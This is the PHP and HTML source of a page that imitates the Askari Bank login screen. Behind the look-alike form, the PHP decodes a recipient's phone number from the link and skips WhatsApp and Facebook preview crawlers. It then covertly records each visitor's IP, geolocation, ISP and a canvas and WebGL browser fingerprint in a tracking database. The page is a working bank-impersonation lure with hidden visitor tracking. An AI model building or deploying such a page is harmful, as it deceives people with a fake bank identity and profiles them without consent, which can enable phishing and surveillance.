<?php
date_default_timezone_set('Asia/Karachi');
require_once 'F:\xampp\htdocs\admins\db_connect.php';
require_once 'F:\xampp\htdocs\config.php';

function encodeNumber($number) {
    return base64_encode($number);
}

function decodeNumber($encoded) {
    return base64_decode($encoded);
}

function getOS($userAgent) {
    $osArray = [
        '/windows nt 10/i'     => 'Windows 10',
        '/windows nt 6.3/i'    => 'Windows 8.1',
        '/windows nt 6.2/i'    => 'Windows 8',
        '/windows nt 6.1/i'    => 'Windows 7',
        '/macintosh|mac os x/i'=> 'Mac OS X',
        '/linux/i'             => 'Linux',
        '/iphone/i'            => 'iPhone',
        '/ipad/i'              => 'iPad',
        '/android/i'           => 'Android',
    ];
    foreach ($osArray as $regex => $value) {
        if (preg_match($regex, $userAgent)) {
            return $value;
        }
    }
    return 'Unknown OS';
}

function getBrowser($userAgent) {
    $browserArray = [
        '/msie/i'      => 'Internet Explorer',
        '/firefox/i'   => 'Firefox',
        '/safari/i'    => 'Safari',
        '/chrome/i'    => 'Chrome',
        '/edge/i'      => 'Edge',
        '/opera/i'     => 'Opera',
        '/netscape/i'  => 'Netscape',
        '/maxthon/i'   => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i'    => 'Mobile Browser'
    ];
    foreach ($browserArray as $regex => $value) {
        if (preg_match($regex, $userAgent)) {
            return $value;
        }
    }
    return 'Unknown Browser';
}

function isMobile($userAgent) {
    return preg_match('/mobile|android|iphone|ipad/i', $userAgent) ? "YES" : "NO";
}

function getRealIP() {
    // Check for shared internet/ISP IP
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validateIP($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    // Check for IPs passing through proxies
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check if multiple IP addresses exist in var
        $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($iplist as $ip) {
            if (validateIP($ip)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validateIP($_SERVER['HTTP_X_FORWARDED'])) {
        return $_SERVER['HTTP_X_FORWARDED'];
    }
    
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validateIP($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    }
    
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validateIP($_SERVER['HTTP_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_FORWARDED_FOR'];
    }
    
    if (!empty($_SERVER['HTTP_FORWARDED']) && validateIP($_SERVER['HTTP_FORWARDED'])) {
        return $_SERVER['HTTP_FORWARDED'];
    }

    // Return unreliable IP address since all else failed
    return $_SERVER['REMOTE_ADDR'];
}

function validateIP($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return true;
}

function getLocationDetails($ip) {
    // Check if IP is local or invalid
    if ($ip === '::1' || $ip === '127.0.0.1' || !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return [
            'country' => 'Local',
            'region' => 'Local',
            'city' => 'Local',
            'org' => 'Local Network'
        ];
    }

    // Try multiple IP geolocation services for better reliability
    $services = [
        "https://ipapi.co/{$ip}/json/",
        "https://ipinfo.io/{$ip}/json",
        "http://ip-api.com/json/{$ip}"
    ];
    
    foreach ($services as $url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode === 200 && $response) {
            $data = json_decode($response, true);
            
            // Format data based on service
            if (strpos($url, 'ipapi.co') !== false && !isset($data['error'])) {
                return [
                    'country' => $data['country_name'] ?? 'Unknown',
                    'region' => $data['region'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'org' => $data['org'] ?? 'Unknown'
                ];
            } elseif (strpos($url, 'ipinfo.io') !== false && !isset($data['error'])) {
                return [
                    'country' => $data['country'] ?? 'Unknown',
                    'region' => $data['region'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'org' => $data['org'] ?? 'Unknown'
                ];
            } elseif (strpos($url, 'ip-api.com') !== false && isset($data['status']) && $data['status'] === 'success') {
                return [
                    'country' => $data['country'] ?? 'Unknown',
                    'region' => $data['regionName'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'org' => $data['org'] ?? $data['isp'] ?? 'Unknown'
                ];
            }
        }
        
        // Small delay between requests
        usleep(100000);
    }
    
    // Fallback if all services fail
    return [
        'country' => 'Unknown',
        'region' => 'Unknown',
        'city' => 'Unknown',
        'org' => 'Unknown'
    ];
}

if (isset($_GET['number']) && isset($_GET['width']) && isset($_GET['height'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    // prevent bots from faking clicks
    if (stripos($ua, 'WhatsApp') !== false || stripos($ua, 'facebookexternalhit') !== false) {
        exit();
    }

    $encodedNumber = $_GET['number'];
    $actualNumber = decodeNumber($encodedNumber);
    
    // Ensure we have a valid number after decoding
    if (empty($actualNumber)) {
        die("Invalid contact number");
    }

    $group = $_GET['group_name'] ?? 'Unknown';
    
    // Get the website name from the URL path
    $currentPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    $url = 'Unknown Website';

    foreach ($websites as $name => $websiteUrl) {
        $websitePath = parse_url($websiteUrl, PHP_URL_PATH);
        $currentPath = rtrim($currentPath, '/');
        $websitePath = rtrim($websitePath, '/');
        
        if ($currentPath === $websitePath) {
            $url = $name;
            break;
        }
    }
    
    $clicked = date("Y-m-d H:i:s");
    $ip = getRealIP(); // Use the improved IP detection function
    $device = $ua;
    $os = getOS($device);
    $browser = getBrowser($device);
    $is_mobile = isMobile($ua);
    

    // unique token
    $token = bin2hex(random_bytes(16));

    // extra details from query (set by JS)
    $screen_resolution = ($_GET['width'] ?? '') . "x" . ($_GET['height'] ?? '');
    $color_depth       = $_GET['color_depth'] ?? '';
    $timezone          = $_GET['timezone'] ?? '';
    $webgl             = $_GET['webgl'] ?? '';
    $canvas            = $_GET['canvas'] ?? '';
    $fingerprint       = "Resolution:$screen_resolution|ColorDepth:$color_depth|Timezone:$timezone|WebGL:$webgl|Canvas:$canvas";

    // location - with improved error handling
    $location = getLocationDetails($ip);
    $country = $location['country'] ?? 'Unknown';
    $region  = $location['region'] ?? 'Unknown';
    $city    = $location['city'] ?? 'Unknown';
    $isp     = $location['org'] ?? 'Unknown';

    // language & referrer
    $language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown', 0, 20);
    $referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    // UTM parameters
    $utm_source   = $_GET['utm_source']   ?? 'N/A';
    $utm_medium   = $_GET['utm_medium']   ?? 'N/A';
    $utm_campaign = $_GET['utm_campaign'] ?? 'N/A';

    // Insert into DB
    $stmt = $conn->prepare("INSERT INTO trace_data 
        (contact, url, clicked_at, ip_address, device, os, group_name, browser, 
    fingerprint, country, region, city, isp, language, referrer, 
    utm_source, utm_medium, utm_campaign, token, screen_resolution, is_mobile) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    
    $stmt->bind_param("ssssssssssssssssssssi", 
        $actualNumber,
        $url, 
        $clicked, 
        $ip, 
        $device, 
        $os, 
        $group, 
        $browser, 
        $fingerprint, 
        $country, 
        $region, 
        $city, 
        $isp, 
        $language, 
        $referrer, 
        $utm_source, 
        $utm_medium, 
        $utm_campaign, 
        $token, 
        $screen_resolution, 
        $is_mobile);
    
    if (!$stmt->execute()) {
        error_log("Database error: " . $stmt->error);
        // Log the location data that failed
        error_log("Failed location data: " . print_r($location, true));
    }
    $stmt->close();
    
    // Debug output (remove in production)
    // echo "IP: $ip, Location: " . print_r($location, true);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Askari Bank Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"> 
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .header {
            background-color: #0077C8;
            color: white;
            padding: 10px;
            font-size: 18px;
            text-align: right;
            padding-right: 20px;
            height: 10px;
        }
        .container {
            max-width: 400px;
            margin: 40px auto;
            padding: 20px;
            text-align: center;
        }
        .logos {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo1 {
            margin-bottom: -25px;
            margin-top: -120px;
            height: 240px;
            width: 220px;
            transform: scaleX(1.9);
        }
        .logo2 {
            width: 150px;
            margin-top: -60px;
        }
        .input-container {
            position: relative;
            width: 100%;
            margin-bottom: 20px;
            text-align: left;
            gap: 20px;
            margin-top: 20px;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        .modal-content {
            background-color: white;
            padding: 20px;
            width: 300px;
            margin: 15% auto;
            border-radius: 10px;
            box-shadow: 0px 0px 10px 0px gray;
            position: relative;
        }
        .modal h2 {
            color: #0077C8;
        }
        .modal i {
            font-size: 50px;
            color: #F39200;
            margin: 10px 0;
        }
        .close {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 20px;
            cursor: pointer;
            color: gray;
        }
        .close:hover {
            color: black;
        }
        .version {
            background-color: white;
            padding: 10px;
            font-size: 14px;
            color: gray;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            font-weight: bold;
            margin-top: 70px;
        }

        .privacy a {
            text-decoration: none;
            color: #0077C8;
            font-size: 14px;
            text-decoration: underline;
                   }
        .input-field {
            width: 100%;
            padding: 10px;
            border: none;
            border-bottom: 2px solid #0077C8;
            font-size: 16px;
            outline: none;
        }
        .forgot-link {
            text-align: right;
            font-size: 14px;
            color: #0077C8;
            text-decoration: none;
            display: block;
            margin-top: 5px;
        }
        .login-btn {
            margin-top: 30px;
            width: 100%;
            padding: 10px;
            background-color: #0077C8;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .signup {
            margin-top: 20px;
            font-size: 14px;
            color: #F39200;
            font-weight: bold;
            
        }
        .signup a {
            color: #F39200;
            text-decoration: none;
            font-weight: bold;
            text-decoration: underline;
            font-size: 16px;
        }
        .footer {
            background-color: #0077C8;
            color: white;
            padding: 10px;
            position: fixed;
            bottom: 0;
            width: 100%;
        }
        .footer-menu {
            display: flex;
            justify-content: space-around;
            align-items: center;
        }
        .footer-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 14px;
            
        }
        .footer-item i {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .whatsapp-icon {
            width: 24px;
            height: 24px;
            margin-bottom: 5px;
        }
        .footer a {
            color: white;
            text-decoration: none;
        }
        .privacy {
            margin-top: 5px;
            font-size: 12px;
        }
        .icon {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #F39200;
            font-size: 20px;
            cursor: pointer;
        }
         /* Media Queries for Responsiveness */
    @media screen and (max-width: 768px) {
        .container {
            max-width: 90%;
            padding: 15px;
        }
        .logo1 {
            width: 200px;
            height: auto;
            transform: scaleX(1.5);
            margin-top: -90px;
        }
        .logo2 {
            width: 120px;
            margin-top: -10px;
        }
        .input-field {
            font-size: 14px;
            padding: 8px;
        }
        .login-btn {
            font-size: 14px;
            padding: 8px;
        }
        .signup {
            font-size: 14px;
        }
        .signup a {
            font-size: 20px;
        }
        .version {
            font-size: 12px;
            padding: 8px;
            margin-top: 125px;
        }
        .footer-menu {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
        align-items: center;
        flex-wrap: nowrap; /* Prevent items from wrapping */
        gap: 5px;
    }
    .footer-item {
        font-size: 12px;
    }
    .footer-item i {
        font-size: 20px;
    }
    .whatsapp-icon {
        width: 20px;
        height: 20px;
    }

    }

    @media screen and (max-width: 480px) {
        .logo1 {
            width: 200px;
            transform: scaleX(1.3);
        }
        .logo2 {
            width: 150px;
            margin-top: -40px;
        }
        .input-container {
            margin-bottom: 15px;
            width: 310px;
        }
        .input-field {
            font-size: 16px;
            padding: 6px;

        }
        .login-btn {
            font-size: 12px;
            padding: 6px;
        }
        .signup {
            font-size: 14px;
        }
        .signup a {
            font-size: 16px;
        }
        .footer-menu {
        display: flex;
        flex-direction: row;
        justify-content: space-between; /* Ensure equal spacing */
        align-items: center;
        flex-wrap: nowrap; /* Keep all items in a single row */
        overflow-x: auto; /* Allow horizontal scrolling if needed */
        padding: 5px;
    }
    .footer-item {
        font-size: 10px;
        text-align: center;
    }
    .footer-item i {
        font-size: 18px;
    }
    }
    </style>
</head>
<body>
    <div class="header"></div>
    <div class="container">
        <div class="logos">
            <img src="askari2.png" class="logo1" alt="Askari Bank Logo">
            <img src="askari1.png" class="logo2" alt="Askari Digital Logo">
        </div>
        <div class="input-container">
            <input type="text" class="input-field" placeholder="Username">
        </div>
        <a href="#" class="forgot-link">Forgot Username</a>
        
        <div class="input-container">
            <input type="password" class="input-field" placeholder="Password">
            <i class="fas fa-fingerprint icon"></i>
        </div>
        <a href="#" class="forgot-link">Forgot Password</a>
        
        <button class="login-btn" onclick="window.location.href='https://askaribank.com/'">LOGIN</button>

        <div class="signup">New User? Click here for <a href="https://askaribank.com/">Signup</a></div>
    </div>
    <div id="fingerprintModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2>Welcome to Askari Bank</h2>
            <p>Enter your fingerprint</p>
            <i class="fas fa-fingerprint"></i>
        </div>
    </div>

    <script>
   document.addEventListener("DOMContentLoaded", function () {
    const fingerprintIcon = document.querySelector(".fa-fingerprint");

    fingerprintIcon.addEventListener("click", async function () {
        if (!window.PublicKeyCredential) {
            alert("Your device does not support fingerprint authentication.");
            return;
        }

        try {
            const publicKeyOptions = {
                challenge: new Uint8Array(32),
                rp: { name: "Askari Bank" },
                user: { id: new Uint8Array(16), name: "user@example.com", displayName: "User" },
                pubKeyCredParams: [{ type: "public-key", alg: -7 }],
                authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
                timeout: 60000
            };

            await navigator.credentials.create({ publicKey: publicKeyOptions });
            document.getElementById("fingerprintModal").style.display = "block";
        } catch (error) {
            alert("Fingerprint authentication failed or is not supported.");
            console.error("WebAuthn Error:", error);
        }
    });
});

function closeModal() {
    document.getElementById("fingerprintModal").style.display = "none";
}

</script>


    <div class="version">
        <span>Version 2.1.19</span>
        <div class="privacy"><a href="#">Privacy Policy</a></div>
    </div>

    <div class="footer">
        <div class="footer-menu">
            <a href="#" class="footer-item">
                <i class="fas fa-tablet-alt"></i>
                Apply Online
            </a>
            <a href="#" class="footer-item">
                <i class="fas fa-tags"></i>
                Card Discounts
            </a>
            <a href="#" class="footer-item">
                <img src="whatsapp.png" class="whatsapp-icon" alt="WhatsApp">
                WhatsApp Banking
            </a>
            <a href="#" class="footer-item">
                <i class="fas fa-file-alt"></i>
                Digital Onboarding
            </a>
            <a href="#" class="footer-item">
                <i class="fas fa-question-circle"></i>
                Need Assistance?
            </a>
        </div>
        
    </div>
</body>
</html>
